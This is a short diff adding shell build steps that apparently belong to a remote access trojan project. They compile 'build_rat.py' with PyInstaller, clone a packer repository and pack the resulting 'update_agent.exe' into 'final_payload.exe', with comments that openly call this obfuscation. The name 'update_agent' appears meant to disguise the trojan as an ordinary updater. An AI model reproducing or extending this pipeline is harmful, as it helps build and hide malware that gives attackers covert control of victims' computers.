@@ -1,0 +1,8 @@
+# On Kali Linux (or WSL)
+mkdir dist
+pip install pyinstaller
+python build_rat.py
+
+# Obfuscate with Themida-like packing (free alternative)
+git clone https://github.com/sztupy/UPX-Themida-Bridge upx_mod
+upx_mod/upx --ultra-brute --compress-icons=0 dist/update_agent.exe -o dist/final_payload.exe
